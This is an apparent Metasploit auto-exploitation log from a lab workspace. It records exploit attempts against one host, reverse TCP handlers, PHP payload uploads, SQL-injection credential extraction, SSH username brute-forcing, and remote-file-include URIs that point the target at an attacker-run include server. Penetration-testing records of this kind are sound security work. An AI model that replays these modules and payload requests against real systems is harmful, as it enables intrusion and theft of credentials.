[*] [2016.06.04-09:39:11] [0065] 10.198.0.1:80 - Uploading payload...
[*] [2016.06.04-09:39:17] [0064] Successfully uploaded IXOn1ibzaQY8ouozsGaP.php
[-] [2016.06.04-09:39:19] [0046] Denied...
[*] [2016.06.04-09:39:22] [0064] Successfully uploaded vmzWwdJw3FqfICUdesxr.php
[*] [2016.06.04-09:39:22] [0064] Successfully reset original password hash.
[*] [2016.06.04-09:39:22] [0064] Successfully removed /images/IXOn1ibzaQY8ouozsGaP.php
[*] [2016.06.04-09:39:22] [0064] Calling payload: /images/vmzWwdJw3FqfICUdesxr.php
[*] [2016.06.04-09:39:23] [0064] Successfully removed /images/vmzWwdJw3FqfICUdesxr.php
[*] [2016.06.04-09:39:25] [0042] 10.198.0.1:22 - Trying username 'OutOfBox'
[+] [2016.06.04-09:39:26] Workspace:lab5 Progress:70/775 (9%) [66/770] 10.198.0.1:80 - TikiWiki tiki-graph_formula Remote PHP Code Execution
[*] [2016.06.04-09:39:26] [0066] Started reverse TCP handler on 0.0.0.0:1054
[*] [2016.06.04-09:39:26] [0066] Attempting to obtain database credentials...
[*] [2016.06.04-09:39:26] [0066] No response from the server
[*] [2016.06.04-09:39:26] [0066] Attempting to execute our payload...
[+] [2016.06.04-09:39:29] Workspace:lab5 Progress:71/775 (9%) [67/770] 10.198.0.1:8080 - Generic Web Application Unix Command Execution
[-] [2016.06.04-09:39:29] No reverse connect payloads available for exploit/unix/webapp/generic_exec
[-] [2016.06.04-09:39:29] No payloads were compatible with exploit/unix/webapp/generic_exec)
[-] [2016.06.04-09:39:29] [0067] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:29] Workspace:lab5 Progress:72/775 (9%) [68/770] 10.198.0.1:80 - Pandora FMS Remote Code Execution
[-] [2016.06.04-09:39:29] No reverse connect payloads available for exploit/linux/http/pandora_fms_exec
[-] [2016.06.04-09:39:29] No payloads were compatible with exploit/linux/http/pandora_fms_exec)
[-] [2016.06.04-09:39:29] [0068] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:30] Workspace:lab5 Progress:73/775 (9%) [69/770] 10.198.0.1:80 - Pandora FMS Default Credential / SQLi Remote Code Execution
[*] [2016.06.04-09:39:30] [0069] Started reverse TCP handler on 0.0.0.0:1055
[*] [2016.06.04-09:39:30] [0069] Attempting to authenticate using (admin:pandora)
[-] [2016.06.04-09:39:30] [0069] Authentication failed!
[*] [2016.06.04-09:39:30] [0069] Attempting to extract auto login hash via SQLi
[-] [2016.06.04-09:39:30] [0069] No auto login password has been defined!
[*] [2016.06.04-09:39:30] [0069] Attempting to extract admin password hash with SQLi
[-] [2016.06.04-09:39:30] [0069] Unable to extract password hash!
[-] [2016.06.04-09:39:30] [0069] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Unable to perform remote code execution!
[+] [2016.06.04-09:39:30] Workspace:lab5 Progress:74/775 (9%) [70/770] 10.198.0.1:8080 - LifeSize UVC Authenticated RCE via Ping
[-] [2016.06.04-09:39:30] No reverse connect payloads available for exploit/linux/http/lifesize_uvc_ping_rce
[-] [2016.06.04-09:39:30] No payloads were compatible with exploit/linux/http/lifesize_uvc_ping_rce)
[-] [2016.06.04-09:39:31] [0070] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:31] Workspace:lab5 Progress:75/775 (9%) [71/770] 10.198.0.1:80 - TikiWiki jhot Remote Command Execution
[-] [2016.06.04-09:39:31] No reverse connect payloads available for exploit/unix/webapp/tikiwiki_jhot_exec
[-] [2016.06.04-09:39:31] No payloads were compatible with exploit/unix/webapp/tikiwiki_jhot_exec)
[-] [2016.06.04-09:39:31] [0071] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:32] Workspace:lab5 Progress:76/775 (9%) [72/770] 10.198.0.1:80 - Cacti graph_view.php Remote Command Execution
[-] [2016.06.04-09:39:32] No reverse connect payloads available for exploit/unix/webapp/cacti_graphimage_exec
[-] [2016.06.04-09:39:32] No payloads were compatible with exploit/unix/webapp/cacti_graphimage_exec)
[-] [2016.06.04-09:39:32] [0072] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:32] Workspace:lab5 Progress:77/775 (9%) [73/770] 10.198.0.1:80 - Generic Web Application Unix Command Execution
[-] [2016.06.04-09:39:32] No reverse connect payloads available for exploit/unix/webapp/generic_exec
[-] [2016.06.04-09:39:32] No payloads were compatible with exploit/unix/webapp/generic_exec)
[-] [2016.06.04-09:39:32] [0073] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:33] Workspace:lab5 Progress:78/775 (10%) [74/770] 10.198.0.1:80 - RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution
[-] [2016.06.04-09:39:33] No reverse connect payloads available for exploit/linux/http/piranha_passwd_exec
[-] [2016.06.04-09:39:33] No payloads were compatible with exploit/linux/http/piranha_passwd_exec)
[-] [2016.06.04-09:39:33] [0074] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:34] Workspace:lab5 Progress:79/775 (10%) [75/770] 10.198.0.1:8080 - BASE base_qry_common Remote File Include
[*] [2016.06.04-09:39:34] [0075] Started reverse TCP handler on 0.0.0.0:1056
[*] [2016.06.04-09:39:34] [0075] 10.198.0.1:8080 - Using URL: http://0.0.0.0:1057/etyIRhIe
[*] [2016.06.04-09:39:34] [0075] 10.198.0.1:8080 - Local IP: http://10.0.2.15:1057/etyIRhIe
[*] [2016.06.04-09:39:34] [0075] 10.198.0.1:8080 - PHP include server started.
[*] [2016.06.04-09:39:34] [0075] 10.198.0.1:8080 - Trying uri /base/base_qry_common.php?BASE_path=%68%74%74%70%3a%2f%2f%31%30%2e%31%39%38%2e%30%2e%32%3a%31%30%35%37%2f%65%74%79%49%52%68%49%65%3f
[-] [2016.06.04-09:39:34] [0075] 10.198.0.1:8080 - Server returned non-200 status code (404)
[*] [2016.06.04-09:39:38] [0042] 10.198.0.1:22 - Trying username 'ROOT'
[+] [2016.06.04-09:39:39] Workspace:lab5 Progress:80/775 (10%) [76/770] 10.198.0.1:80 - Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution
[-] [2016.06.04-09:39:39] No reverse connect payloads available for exploit/linux/http/sophos_wpa_iface_exec
[-] [2016.06.04-09:39:39] No payloads were compatible with exploit/linux/http/sophos_wpa_iface_exec)
[+] [2016.06.04-09:39:40] Workspace:lab5 Progress:81/775 (10%) [77/770] 10.198.0.1:80 - BASE base_qry_common Remote File Include
[*] [2016.06.04-09:39:40] [0077] Started reverse TCP handler on 0.0.0.0:1058
[*] [2016.06.04-09:39:40] [0077] 10.198.0.1:80 - Using URL: http://0.0.0.0:1059/Z6pCrTV9na6UtkY
[*] [2016.06.04-09:39:40] [0077] 10.198.0.1:80 - Local IP: http://10.0.2.15:1059/Z6pCrTV9na6UtkY
[*] [2016.06.04-09:39:40] [0077] 10.198.0.1:80 - PHP include server started.
[*] [2016.06.04-09:39:40] [0077] 10.198.0.1:80 - Trying uri /base/base_qry_common.php?BASE_path=%68%74%74%70%3a%2f%2f%31%30%2e%31%39%38%2e%30%2e%32%3a%31%30%35%39%2f%5a%36%70%43%72%54%56%39%6e%61%36%55%74%6b%59%3f
[-] [2016.06.04-09:39:40] [0077] 10.198.0.1:80 - Server returned non-200 status code (302)
[+] [2016.06.04-09:39:45] Workspace:lab5 Progress:82/775 (10%) [78/770] 10.198.0.1:80 - Barracuda IMG.PL Remote Command Execution
[-] [2016.06.04-09:39:45] No reverse connect payloads available for exploit/unix/webapp/barracuda_img_exec
[-] [2016.06.04-09:39:45] No payloads were compatible with exploit/unix/webapp/barracuda_img_exec)
[-] [2016.06.04-09:39:45] [0078] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:46] Workspace:lab5 Progress:83/775 (10%) [79/770] 10.198.0.1:80 - TWiki History TWikiUsers rev Parameter Command Execution
[-] [2016.06.04-09:39:46] No reverse connect payloads available for exploit/unix/webapp/twiki_history
[-] [2016.06.04-09:39:46] No payloads were compatible with exploit/unix/webapp/twiki_history)
[-] [2016.06.04-09:39:46] [0079] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:46] Workspace:lab5 Progress:84/775 (10%) [80/770] 10.198.0.1:8080 - Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability
[*] [2016.06.04-09:39:46] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:39:46] [0080] Started reverse TCP handler on 0.0.0.0:1060
[*] [2016.06.04-09:39:46] [0080] Sending request to 10.198.0.1:8080
[-] [2016.06.04-09:39:47] [0080] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-09:39:48] Workspace:lab5 Progress:85/775 (10%) [81/770] 10.198.0.1:80 - Mambo Cache_Lite Class mosConfig_absolute_path Remote File Include
[*] [2016.06.04-09:39:48] [0081] Started reverse TCP handler on 0.0.0.0:1061
[*] [2016.06.04-09:39:48] [0081] 10.198.0.1:80 - Using URL: http://0.0.0.0:1062/8fVZSUoz9m
[*] [2016.06.04-09:39:48] [0081] 10.198.0.1:80 - Local IP: http://10.0.2.15:1062/8fVZSUoz9m
[*] [2016.06.04-09:39:48] [0081] 10.198.0.1:80 - PHP include server started.
[*] [2016.06.04-09:39:48] [0081] 10.198.0.1:80 - Trying uri /includes/Cache/Lite/Output.php?mosConfig_absolute_path=%68%74%74%70%3a%2f%2f%31%30%2e%31%39%38%2e%30%2e%32%3a%31%30%36%32%2f%38%66%56%5a%53%55%6f%7a%39%6d%3f
[-] [2016.06.04-09:39:48] [0081] 10.198.0.1:80 - Server returned non-200 status code (302)
[*] [2016.06.04-09:39:50] [0042] 10.198.0.1:22 - Trying username 'adm'
[+] [2016.06.04-09:39:53] Workspace:lab5 Progress:86/775 (11%) [82/770] 10.198.0.1:8080 - Barracuda IMG.PL Remote Command Execution
[-] [2016.06.04-09:39:53] No reverse connect payloads available for exploit/unix/webapp/barracuda_img_exec
[-] [2016.06.04-09:39:53] No payloads were compatible with exploit/unix/webapp/barracuda_img_exec)
[-] [2016.06.04-09:39:53] [0082] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:54] Workspace:lab5 Progress:87/775 (11%) [83/770] 10.198.0.1:8080 - AWStats Totals multisort Remote Command Execution
[-] [2016.06.04-09:39:54] No reverse connect payloads available for exploit/unix/webapp/awstatstotals_multisort
[-] [2016.06.04-09:39:54] No payloads were compatible with exploit/unix/webapp/awstatstotals_multisort)
[-] [2016.06.04-09:39:54] [0083] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:54] Workspace:lab5 Progress:88/775 (11%) [84/770] 10.198.0.1:8080 - Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload
[*] [2016.06.04-09:39:54] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:39:55] [0084] Started reverse TCP handler on 0.0.0.0:1063
[-] [2016.06.04-09:39:55] [0084] Exploit aborted due to failure: not-vulnerable: Target does not have voice-servlet
[+] [2016.06.04-09:39:56] Workspace:lab5 Progress:89/775 (11%) [85/770] 10.198.0.1:80 - phpFileManager 0.9.8 Remote Code Execution
[-] [2016.06.04-09:39:56] No reverse connect payloads available for exploit/multi/http/phpfilemanager_rce
[-] [2016.06.04-09:39:56] No payloads were compatible with exploit/multi/http/phpfilemanager_rce)
[-] [2016.06.04-09:39:56] [0085] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:39:56] Workspace:lab5 Progress:90/775 (11%) [86/770] 10.198.0.1:80 - PHP Utility Belt Remote Code Execution
[*] [2016.06.04-09:39:56] [0086] Started reverse TCP handler on 0.0.0.0:1064
[+] [2016.06.04-09:39:59] Workspace:lab5 Progress:91/775 (11%) [87/770] 10.198.0.1:8080 - Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability
[*] [2016.06.04-09:39:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:39:59] [0087] Started reverse TCP handler on 0.0.0.0:1065
[-] [2016.06.04-09:39:59] [0087] Exploit aborted due to failure: not-vulnerable: Target does not appear to be Oracle BeeHive
[+] [2016.06.04-09:39:59] Workspace:lab5 Progress:92/775 (11%) [88/770] 10.198.0.1:80 - WordPress WPshop eCommerce Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:40:00] [0088] Started reverse TCP handler on 0.0.0.0:1066
[-] [2016.06.04-09:40:00] [0088] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-09:40:00] Workspace:lab5 Progress:93/775 (12%) [89/770] 10.198.0.1:80 - TWiki Search Function Arbitrary Command Execution
[-] [2016.06.04-09:40:00] No reverse connect payloads available for exploit/unix/webapp/twiki_search
[-] [2016.06.04-09:40:00] No payloads were compatible with exploit/unix/webapp/twiki_search)
[-] [2016.06.04-09:40:00] [0089] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:01] Workspace:lab5 Progress:94/775 (12%) [90/770] 10.198.0.1:80 - WordPress Admin Shell Upload
[+] [2016.06.04-09:40:01] Workspace:lab5 Progress:95/775 (12%) [91/770] 10.198.0.1:8080 - Pandora FMS Remote Code Execution
[-] [2016.06.04-09:40:01] No reverse connect payloads available for exploit/linux/http/pandora_fms_exec
[-] [2016.06.04-09:40:01] No payloads were compatible with exploit/linux/http/pandora_fms_exec)
[-] [2016.06.04-09:40:01] [0091] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:02] Workspace:lab5 Progress:96/775 (12%) [92/770] 10.198.0.1:80 - Wordpress Ajax Load More PHP Upload Vulnerability
[+] [2016.06.04-09:40:02] Workspace:lab5 Progress:97/775 (12%) [93/770] 10.198.0.1:8080 - Pandora FMS Default Credential / SQLi Remote Code Execution
[*] [2016.06.04-09:40:03] [0093] Started reverse TCP handler on 0.0.0.0:1069
[*] [2016.06.04-09:40:03] [0093] Attempting to authenticate using (admin:pandora)
[-] [2016.06.04-09:40:03] [0093] Authentication failed!
[*] [2016.06.04-09:40:03] [0093] Attempting to extract auto login hash via SQLi
[-] [2016.06.04-09:40:03] [0093] No auto login password has been defined!
[*] [2016.06.04-09:40:03] [0093] Attempting to extract admin password hash with SQLi
[-] [2016.06.04-09:40:03] [0093] Unable to extract password hash!
[-] [2016.06.04-09:40:03] [0093] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Unable to perform remote code execution!
[*] [2016.06.04-09:40:03] [0042] 10.198.0.1:22 - Trying username 'admin'
[+] [2016.06.04-09:40:04] Workspace:lab5 Progress:98/775 (12%) [94/770] 10.198.0.1:80 - Nibbleblog File Upload Vulnerability
[+] [2016.06.04-09:40:04] Workspace:lab5 Progress:99/775 (12%) [95/770] 10.198.0.1:80 - Wordpress Download Manager (download-manager) Unauthenticated File Upload
[*] [2016.06.04-09:40:04] [0095] Started reverse TCP handler on 0.0.0.0:1071
[*] [2016.06.04-09:40:04] [0095] Uploading payload
[-] [2016.06.04-09:40:05] [0095] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Error on uploading file
[+] [2016.06.04-09:40:05] Workspace:lab5 Progress:100/775 (12%) [96/770] 10.198.0.1:8080 - Novell iManager getMultiPartParameters Arbitrary File Upload
[-] [2016.06.04-09:40:05] No reverse connect payloads available for exploit/windows/http/novell_imanager_upload
[-] [2016.06.04-09:40:05] No payloads were compatible with exploit/windows/http/novell_imanager_upload)
[-] [2016.06.04-09:40:05] [0096] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:05] Workspace:lab5 Progress:101/775 (13%) [97/770] 10.198.0.1:80 - Th3 MMA mma.php Backdoor Arbitrary File Upload
[*] [2016.06.04-09:40:06] [0097] Started reverse TCP handler on 0.0.0.0:1072
[*] [2016.06.04-09:40:06] [0097] Trying to upload EwwaK.php to mma.php Backdoor
[-] [2016.06.04-09:40:06] [0097] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 200
[+] [2016.06.04-09:40:06] Workspace:lab5 Progress:102/775 (13%) [98/770] 10.198.0.1:8080 - AWStats migrate Remote Command Execution
[-] [2016.06.04-09:40:06] No reverse connect payloads available for exploit/unix/webapp/awstats_migrate_exec
[-] [2016.06.04-09:40:06] No payloads were compatible with exploit/unix/webapp/awstats_migrate_exec)
[-] [2016.06.04-09:40:06] [0098] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:07] Workspace:lab5 Progress:103/775 (13%) [99/770] 10.198.0.1:8080 - AWStats configdir Remote Command Execution
[-] [2016.06.04-09:40:07] No reverse connect payloads available for exploit/unix/webapp/awstats_configdir_exec
[-] [2016.06.04-09:40:07] No payloads were compatible with exploit/unix/webapp/awstats_configdir_exec)
[-] [2016.06.04-09:40:07] [0099] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:07] Workspace:lab5 Progress:104/775 (13%) [100/770] 10.198.0.1:80 - WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution
[*] [2016.06.04-09:40:07] [0100] Started reverse TCP handler on 0.0.0.0:1073
[*] [2016.06.04-09:40:07] [0100] Sending PHP payload
[-] [2016.06.04-09:40:08] [0100] File wasn't uploaded, aborting!
[+] [2016.06.04-09:40:10] Workspace:lab5 Progress:105/775 (13%) [101/770] 10.198.0.1:80 - AWStats migrate Remote Command Execution
[-] [2016.06.04-09:40:10] No reverse connect payloads available for exploit/unix/webapp/awstats_migrate_exec
[-] [2016.06.04-09:40:10] No payloads were compatible with exploit/unix/webapp/awstats_migrate_exec)
[-] [2016.06.04-09:40:10] [0101] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:11] Workspace:lab5 Progress:106/775 (13%) [102/770] 10.198.0.1:80 - Generic Web Application Unix Command Execution
[-] [2016.06.04-09:40:11] No reverse connect payloads available for exploit/pro/web/generic_exec
[-] [2016.06.04-09:40:11] No payloads were compatible with exploit/pro/web/generic_exec)
[-] [2016.06.04-09:40:11] [0102] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:12] Workspace:lab5 Progress:107/775 (13%) [103/770] 10.198.0.1:8080 - RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution
[-] [2016.06.04-09:40:12] No reverse connect payloads available for exploit/linux/http/piranha_passwd_exec
[-] [2016.06.04-09:40:12] No payloads were compatible with exploit/linux/http/piranha_passwd_exec)
[-] [2016.06.04-09:40:12] [0103] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:12] Workspace:lab5 Progress:108/775 (13%) [104/770] 10.198.0.1:8080 - Sophos Web Protection Appliance Interface Authenticated Arbitrary Command Execution
[-] [2016.06.04-09:40:12] No reverse connect payloads available for exploit/linux/http/sophos_wpa_iface_exec
[-] [2016.06.04-09:40:12] No payloads were compatible with exploit/linux/http/sophos_wpa_iface_exec)
[+] [2016.06.04-09:40:13] Workspace:lab5 Progress:109/775 (14%) [105/770] 10.198.0.1:80 - X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution
[+] [2016.06.04-09:40:13] Workspace:lab5 Progress:110/775 (14%) [106/770] 10.198.0.1:80 - ManageEngine ServiceDesk Plus Arbitrary File Upload
[*] [2016.06.04-09:40:13] [0106] Started reverse TCP handler on 0.0.0.0:1075
[*] [2016.06.04-09:40:14] [0106] Uploading EAR file...
[-] [2016.06.04-09:40:14] [0106] Exploit aborted due to failure: unknown: 10.198.0.1:80 - EAR upload failed
[+] [2016.06.04-09:40:14] Workspace:lab5 Progress:111/775 (14%) [107/770] 10.198.0.1:8080 - Joomla Component JCE File Upload Remote Code Execution
[*] [2016.06.04-09:40:14] [0107] Started reverse TCP handler on 0.0.0.0:1076
[*] [2016.06.04-09:40:14] [0107] Checking component version to 10.198.0.1:8080
[*] [2016.06.04-09:40:16] [0042] 10.198.0.1:22 - Trying username 'administrator'
[+] [2016.06.04-09:40:17] Workspace:lab5 Progress:112/775 (14%) [108/770] 10.198.0.1:8080 - Dell KACE K1000 File Upload
[-] [2016.06.04-09:40:17] No reverse connect payloads available for exploit/unix/http/dell_kace_k1000_upload
[-] [2016.06.04-09:40:17] No payloads were compatible with exploit/unix/http/dell_kace_k1000_upload)
[-] [2016.06.04-09:40:17] [0108] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:18] Workspace:lab5 Progress:113/775 (14%) [109/770] 10.198.0.1:80 - WordPress cache_lastpostdate Arbitrary Code Execution
[-] [2016.06.04-09:40:18] No reverse connect payloads available for exploit/unix/webapp/wp_lastpost_exec
[-] [2016.06.04-09:40:18] No payloads were compatible with exploit/unix/webapp/wp_lastpost_exec)
[-] [2016.06.04-09:40:18] [0109] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:18] Workspace:lab5 Progress:114/775 (14%) [110/770] 10.198.0.1:8080 - Generic Web Application Unix Command Execution
[-] [2016.06.04-09:40:18] No reverse connect payloads available for exploit/pro/web/generic_exec
[-] [2016.06.04-09:40:18] No payloads were compatible with exploit/pro/web/generic_exec)
[-] [2016.06.04-09:40:18] [0110] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:19] Workspace:lab5 Progress:115/775 (14%) [111/770] 10.198.0.1:80 - Wordpress N-Media Website Contact Form Upload Vulnerability
[*] [2016.06.04-09:40:19] [0111] Started reverse TCP handler on 0.0.0.0:1077
[-] [2016.06.04-09:40:19] [0111] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 200
[+] [2016.06.04-09:40:19] Workspace:lab5 Progress:116/775 (14%) [112/770] 10.198.0.1:80 - Dell KACE K1000 File Upload
[-] [2016.06.04-09:40:19] No reverse connect payloads available for exploit/unix/http/dell_kace_k1000_upload
[-] [2016.06.04-09:40:19] No payloads were compatible with exploit/unix/http/dell_kace_k1000_upload)
[-] [2016.06.04-09:40:19] [0112] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:20] Workspace:lab5 Progress:117/775 (15%) [113/770] 10.198.0.1:8080 - Mambo Cache_Lite Class mosConfig_absolute_path Remote File Include
[*] [2016.06.04-09:40:20] [0113] Started reverse TCP handler on 0.0.0.0:1078
[*] [2016.06.04-09:40:20] [0113] 10.198.0.1:8080 - Using URL: http://0.0.0.0:1079/8oZ257JZ5VLAgo
[*] [2016.06.04-09:40:20] [0113] 10.198.0.1:8080 - Local IP: http://10.0.2.15:1079/8oZ257JZ5VLAgo
[*] [2016.06.04-09:40:20] [0113] 10.198.0.1:8080 - PHP include server started.
[*] [2016.06.04-09:40:20] [0113] 10.198.0.1:8080 - Trying uri /includes/Cache/Lite/Output.php?mosConfig_absolute_path=%68%74%74%70%3a%2f%2f%31%30%2e%31%39%38%2e%30%2e%32%3a%31%30%37%39%2f%38%6f%5a%32%35%37%4a%5a%35%56%4c%41%67%6f%3f
[-] [2016.06.04-09:40:20] [0113] 10.198.0.1:8080 - Server returned non-200 status code (404)
[+] [2016.06.04-09:40:25] Workspace:lab5 Progress:118/775 (15%) [114/770] 10.198.0.1:8080 - Mitel Audio and Web Conferencing Command Injection
[-] [2016.06.04-09:40:25] No reverse connect payloads available for exploit/unix/webapp/mitel_awc_exec
[-] [2016.06.04-09:40:25] No payloads were compatible with exploit/unix/webapp/mitel_awc_exec)
[-] [2016.06.04-09:40:25] [0114] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:26] Workspace:lab5 Progress:119/775 (15%) [115/770] 10.198.0.1:8080 - Nagios3 statuswml.cgi Ping Command Execution
[-] [2016.06.04-09:40:26] No reverse connect payloads available for exploit/unix/webapp/nagios3_statuswml_ping
[-] [2016.06.04-09:40:26] No payloads were compatible with exploit/unix/webapp/nagios3_statuswml_ping)
[-] [2016.06.04-09:40:26] [0115] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:27] Workspace:lab5 Progress:120/775 (15%) [116/770] 10.198.0.1:80 - JBoss JMX Console Deployer Upload and Execute
[+] [2016.06.04-09:40:27] Workspace:lab5 Progress:121/775 (15%) [117/770] 10.198.0.1:80 - AWStats configdir Remote Command Execution
[-] [2016.06.04-09:40:27] No reverse connect payloads available for exploit/unix/webapp/awstats_configdir_exec
[-] [2016.06.04-09:40:27] No payloads were compatible with exploit/unix/webapp/awstats_configdir_exec)
[-] [2016.06.04-09:40:27] [0117] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:28] Workspace:lab5 Progress:122/775 (15%) [118/770] 10.198.0.1:80 - JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)
[*] [2016.06.04-09:40:28] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:40:28] [0118] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:JBoss)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:40:28] Workspace:lab5 Progress:123/775 (15%) [119/770] 10.198.0.1:80 - VMware Hyperic HQ Groovy Script-Console Java Execution
[*] [2016.06.04-09:40:28] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:40:29] [0119] Started reverse TCP handler on 0.0.0.0:1083
[-] [2016.06.04-09:40:29] [0119] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-09:40:29] Workspace:lab5 Progress:124/775 (16%) [120/770] 10.198.0.1:80 - CMS Bolt File Upload Vulnerability
[+] [2016.06.04-09:40:30] Workspace:lab5 Progress:125/775 (16%) [121/770] 10.198.0.1:80 - China Chopper Caidao PHP Backdoor Code Execution
[*] [2016.06.04-09:40:30] [0121] Started reverse TCP handler on 0.0.0.0:1085
[*] [2016.06.04-09:40:30] [0121] Sending exploit...
[*] [2016.06.04-09:40:30] [0042] 10.198.0.1:22 - Trying username 'anon'
[+] [2016.06.04-09:40:33] Workspace:lab5 Progress:126/775 (16%) [122/770] 10.198.0.1:8080 - Zemra Botnet CnC Web Panel Remote Code Execution
[-] [2016.06.04-09:40:33] No reverse connect payloads available for exploit/multi/http/zemra_panel_rce
[-] [2016.06.04-09:40:33] No payloads were compatible with exploit/multi/http/zemra_panel_rce)
[-] [2016.06.04-09:40:33] [0122] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:33] Workspace:lab5 Progress:127/775 (16%) [123/770] 10.198.0.1:80 - WordPress Platform Theme File Upload Vulnerability
[*] [2016.06.04-09:40:33] [0123] Started reverse TCP handler on 0.0.0.0:1086
[*] [2016.06.04-09:40:33] [0123] Uploading payload
[+] [2016.06.04-09:40:36] Workspace:lab5 Progress:128/775 (16%) [124/770] 10.198.0.1:80 - ZeroShell Remote Code Execution
[*] [2016.06.04-09:40:36] [0124] Started reverse TCP handler on 0.0.0.0:1087
[*] [2016.06.04-09:40:36] [0124] Retrieving cleartext admin password
[-] [2016.06.04-09:40:36] [0124] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Retrieving password failed!
[+] [2016.06.04-09:40:36] Workspace:lab5 Progress:129/775 (16%) [125/770] 10.198.0.1:80 - Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload
[*] [2016.06.04-09:40:37] [0125] Started reverse TCP handler on 0.0.0.0:1088
[*] [2016.06.04-09:40:37] [0125] Uploading payload to /wp-content/uploads/wysija/themes/kkceePwCOl/FQvqtdMPoy.php
[-] [2016.06.04-09:40:37] [0125] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-09:40:37] Workspace:lab5 Progress:130/775 (16%) [126/770] 10.198.0.1:8080 - HP OpenView Performance Insight Server Backdoor Account Code Execution
[-] [2016.06.04-09:40:37] No reverse connect payloads available for exploit/windows/http/hp_openview_insight_backdoor
[-] [2016.06.04-09:40:37] No payloads were compatible with exploit/windows/http/hp_openview_insight_backdoor)
[-] [2016.06.04-09:40:37] [0126] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:38] Workspace:lab5 Progress:131/775 (16%) [127/770] 10.198.0.1:80 - Wordpress WPTouch Authenticated File Upload
[+] [2016.06.04-09:40:38] Workspace:lab5 Progress:132/775 (17%) [128/770] 10.198.0.1:80 - Dexter (CasinoLoader) SQL Injection
[*] [2016.06.04-09:40:38] [0128] Started reverse TCP handler on 0.0.0.0:1090
[*] [2016.06.04-09:40:38] [0128] Using SQL injection to acquire credentials
[-] [2016.06.04-09:40:38] [0128] Failed to acquire administrator username
[+] [2016.06.04-09:40:41] Workspace:lab5 Progress:133/775 (17%) [129/770] 10.198.0.1:8080 - X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution
[+] [2016.06.04-09:40:42] Workspace:lab5 Progress:134/775 (17%) [130/770] 10.198.0.1:8080 - Werkzeug Debug Shell Command Execution
[-] [2016.06.04-09:40:42] No reverse connect payloads available for exploit/multi/http/werkzeug_debug_rce
[-] [2016.06.04-09:40:42] No payloads were compatible with exploit/multi/http/werkzeug_debug_rce)
[-] [2016.06.04-09:40:42] [0130] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:42] Workspace:lab5 Progress:135/775 (17%) [131/770] 10.198.0.1:80 - GestioIP Remote Command Execution
[-] [2016.06.04-09:40:42] No reverse connect payloads available for exploit/multi/http/gestioip_exec
[-] [2016.06.04-09:40:42] No payloads were compatible with exploit/multi/http/gestioip_exec)
[-] [2016.06.04-09:40:43] [0131] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:40:43] [0042] 10.198.0.1:22 - Trying username 'auditor'
